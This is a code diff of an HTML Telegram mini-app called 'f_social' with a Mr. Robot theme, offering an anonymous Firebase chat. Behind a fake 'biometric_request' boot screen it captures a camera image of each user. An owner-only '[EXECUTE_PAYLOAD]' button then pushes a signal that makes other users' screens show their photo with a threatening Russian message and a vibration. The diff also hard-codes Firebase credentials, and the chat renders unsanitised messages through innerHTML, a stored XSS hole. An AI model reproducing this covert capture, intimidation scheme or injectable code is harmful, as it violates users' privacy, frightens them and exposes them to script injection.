@@ -7,104 +7,121 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    
     <style>
         :root { --f-red: #ff003c; --f-white: #f0f0f0; --f-black: #0a0a0a; --f-green: #00ff41; }
         body { background: var(--f-black); color: var(--f-white); font-family: 'Courier New', monospace; margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
         
-        /* ТЕРМИНАЛ */
-        #boot-screen { position: fixed; inset: 0; background: #000; z-index: 9999; padding: 20px; font-size: 12px; color: var(--f-green); }
-        
-        #app { display: none; flex-direction: column; height: 100vh; }
-        header { padding: 10px; border-bottom: 1px solid #222; text-align: center; position: relative; }
-        
-        /* КНОПКА АДМИНА */
-        #admin-btn { display: none; position: absolute; right: 10px; top: 10px; background: var(--f-red); color: white; border: none; padding: 5px 10px; font-size: 10px; font-weight: bold; cursor: pointer; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        #boot-screen { position: fixed; inset: 0; background: #000; z-index: 9999; padding: 20px; font-size: 12px; color: var(--f-green); overflow-y: auto; }
+        .cursor { display: inline-block; width: 8px; height: 15px; background: var(--f-green); animation: blink 0.8s infinite; vertical-align: middle; }
+        @keyframes blink { 50% { opacity: 0; } }
 
-        .nav-tabs { display: flex; border-bottom: 1px solid #222; background: #0d0d0d; }
-        .tab { flex: 1; padding: 12px 5px; text-align: center; font-size: 9px; cursor: pointer; color: #444; text-transform: uppercase; }
-        .tab.active { color: var(--f-red); border-bottom: 2px solid var(--f-red); }
+        #app { display: none; flex-direction: column; height: 100vh; position: relative; }
+        header { padding: 15px; border-bottom: 1px solid #222; text-align: center; flex-shrink: 0; }
+        .logo { font-size: 22px; font-weight: bold; letter-spacing: 5px; color: var(--f-red); text-transform: lowercase; }
+        .logo span { color: var(--f-white); }
 
-        .tab-content { display: none; flex-grow: 1; padding: 15px; overflow-y: auto; }
+        #admin-btn { display: none; position: absolute; right: 10px; top: 12px; background: var(--f-red); color: white; border: none; padding: 8px 12px; font-size: 10px; font-weight: bold; cursor: pointer; animation: pulse 1.5s infinite; z-index: 100; border-radius: 2px; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255, 0, 60, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(255, 0, 60, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 0, 60, 0); } }
+
+        .nav-tabs { display: flex; border-bottom: 1px solid #222; flex-shrink: 0; background: #0d0d0d; }
+        .tab { flex: 1; padding: 15px 5px; text-align: center; font-size: 9px; cursor: pointer; color: #444; text-transform: uppercase; transition: 0.3s; }
+        .tab.active { color: var(--f-red); background: rgba(255,0,60,0.05); border-bottom: 2px solid var(--f-red); }
+
+        .tab-content { display: none; flex-grow: 1; padding: 15px; overflow-y: auto; position: relative; }
         .tab-content.active { display: flex; flex-direction: column; }
 
-        #captured-photo { width: 100%; max-width: 300px; border: 2px solid var(--f-red); margin: 15px auto; display: block; }
-        #alert-text { color: var(--f-red); font-weight: bold; text-align: center; display: none; }
-        
-        #global-chat { flex-grow: 1; overflow-y: auto; font-size: 13px; margin-bottom: 10px; }
-        .m-user { color: var(--f-red); font-size: 10px; }
+        #global-chat { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; margin-bottom: 10px; }
+        .m-wrap { border-left: 1px solid #333; padding-left: 10px; }
+        .m-user { color: var(--f-red); font-size: 10px; display: block; }
+        .m-text { font-size: 14px; color: #ccc; }
+
+        .input-box { display: flex; gap: 8px; padding: 10px 0; border-top: 1px solid #222; }
+        input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 12px; font-family: inherit; outline: none; }
+        button#send-btn { background: var(--f-red); color: #fff; border: none; padding: 0 20px; font-weight: bold; }
+
+        #captured-photo { width: 100%; max-width: 320px; border: 2px solid var(--f-red); margin: 20px auto; display: block; filter: contrast(1.1) brightness(0.9); }
+        #alert-text { color: var(--f-red); font-weight: bold; text-align: center; display: none; font-size: 18px; line-height: 1.4; }
     </style>
 </head>
 <body>
 
-    <div id="boot-screen"><div id="boot-logs"></div></div>
+    <div id="boot-screen">
+        <div id="boot-logs"></div>
+        <span class="cursor"></span>
+    </div>
 
     <div id="app">
         <header>
-            <div id="user-id" style="font-size: 10px; color: #555;">USER: anon_wait...</div>
+            <div id="status-node" style="position: absolute; left: 10px; top: 18px; font-size: 8px; color: #333;">NODE: init...</div>
             <div class="logo">f_<span>social</span></div>
             <button id="admin-btn" onclick="triggerHack()">[EXECUTE_PAYLOAD]</button>
         </header>
 
         <nav class="nav-tabs">
-            <div class="tab active" onclick="openTab(event, 'tab-chat')">/chat</div>
+            <div class="tab active" onclick="openTab(event, 'tab-chat')">/global_chat</div>
             <div class="tab" onclick="openTab(event, 'tab-whoami')">/whoami</div>
         </nav>
 
         <div id="tab-chat" class="tab-content active">
             <div id="global-chat"></div>
-            <div style="display:flex; gap:5px;">
-                <input type="text" id="chat-in" style="flex:1; background:#000; border:1px solid #333; color:#fff; padding:10px;">
-                <button onclick="sendMsg()" style="background:var(--f-red); border:none; color:#fff; padding:10px;">></button>
+            <div class="input-box">
+                <input type="text" id="chat-in" placeholder="type_message..." autocomplete="off">
+                <button id="send-btn" onclick="sendMsg()">></button>
             </div>
         </div>
 
         <div id="tab-whoami" class="tab-content">
-            <img id="captured-photo" src="">
+            <p style="text-align:center; font-size:10px; color:#444;">>> TARGET_VISUAL_DATA_ACQUIRED <<</p>
+            <img id="captured-photo" src="" alt="CAPTURED">
             <div id="alert-text">МЫ УЖЕ ВЫЕХАЛИ. КУ ОТ F SOCIAL.</div>
         </div>
     </div>
 
 <script>
-    // 1. КОНФИГ FIREBASE
     const firebaseConfig = {
-        apiKey: "ТВОЙ_КЛЮЧ",
-        databaseURL: "ТВОЯ_ССЫЛКА",
-        projectId: "ТВОЙ_ID"
+        apiKey: "AIzaSyAYX3NCBoMREGY4WZGqgo-kl3hj5h7gq-A",
+        authDomain: "fcocial-v5r.firebaseapp.com",
+        projectId: "fcocial-v5r",
+        storageBucket: "fcocial-v5r.firebasestorage.app",
+        messagingSenderId: "737704812350",
+        appId: "1:737704812350:web:b6254574bcf1d3c5e6166f",
+        databaseURL: "https://fcocial-v5r-default-rtdb.firebaseio.com/"
     };
+
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // 2. ТВОЙ ID (Замени на свой реальный ID из Telegram)
     const MY_TG_ID = 5131628747; 
-    
     let isElliot = false;
     let myNick = "anon_" + Math.floor(Math.random()*999);
 
     window.onload = () => {
         const tg = window.Telegram.WebApp;
         tg.ready();
+        tg.expand();
         
-        // Проверка: это ты или нет?
         if (tg.initDataUnsafe?.user?.id === MY_TG_ID) {
             isElliot = true;
             myNick = "Elliot_Alderson";
             document.getElementById('admin-btn').style.display = 'block';
         }
         
-        document.getElementById('user-id').innerText = `USER: ${myNick}`;
+        document.getElementById('status-node').innerText = `NODE: ${myNick}`;
         bootSequence();
-        listenForHack(); // Слушаем сигнал атаки
     };
 
     async function bootSequence() {
-        const logs = ["init_core...", "auth_check...", "loading_ui..."];
+        const logs = ["f_soc_v5_init...", "tunnel_stable...", "firebase_auth: OK", "biometric_request..."];
         for(let t of logs) {
-            let l = document.createElement('div'); l.innerText = `> ${t}`;
+            let l = document.createElement('div');
+            l.innerText = `> ${t}`;
             document.getElementById('boot-logs').appendChild(l);
-            await new Promise(r => setTimeout(r, 400));
+            await new Promise(r => setTimeout(r, 450));
         }
         startCapture();
+        listenForHack();
+        listenChat();
     }
 
     async function startCapture() {
@@ -121,31 +138,47 @@
                     document.getElementById('boot-screen').style.display = 'none';
                     document.getElementById('app').style.display = 'flex';
                 }, 'image/jpeg');
-            }, 2000);
+            }, 2500);
         } catch(e) {
             document.getElementById('boot-screen').style.display = 'none';
             document.getElementById('app').style.display = 'flex';
         }
     }
 
-    // ЛОГИКА АТАКИ
     function triggerHack() {
         if(!isElliot) return;
-        // Отправляем сигнал "1" в базу
-        db.ref('attack_signal').set(Math.random()); 
-        alert("Payload sent to all nodes.");
+        db.ref('attack_signal').set(Date.now());
+        alert("PAYLOAD SENT.");
     }
 
     function listenForHack() {
-        db.ref('attack_signal').on('value', () => {
-            if (isElliot) return; // Тебя самого не "взламывает"
-            
-            // ПРИНУДИТЕЛЬНОЕ ПЕРЕКЛЮЧЕНИЕ У ЖЕРТВЫ
+        db.ref('attack_signal').on('value', (snap) => {
+            if (isElliot || !snap.val()) return;
             openTab(null, 'tab-whoami');
             document.getElementById('alert-text').style.display = 'block';
-            
-            // Можно добавить вибрацию на телефоне
-            if(window.navigator.vibrate) window.navigator.vibrate([500, 200, 500]);
+            if(window.navigator.vibrate) window.navigator.vibrate([500, 100, 500]);
+        });
+    }
+
+    function sendMsg() {
+        const i = document.getElementById('chat-in');
+        if(!i.value.trim()) return;
+        db.ref('global_chat').push({ user: myNick, text: i.value });
+        i.value = '';
+    }
+
+    function listenChat() {
+        db.ref('global_chat').limitToLast(15).on('value', snap => {
+            const box = document.getElementById('global-chat');
+            box.innerHTML = '';
+            snap.forEach(c => {
+                const d = c.val();
+                const div = document.createElement('div');
+                div.className = 'm-wrap';
+                div.innerHTML = `<span class="m-user">${d.user}:</span><span class="m-text">${d.text}</span>`;
+                box.appendChild(div);
+            });
+            box.scrollTop = box.scrollHeight;
         });
     }
 
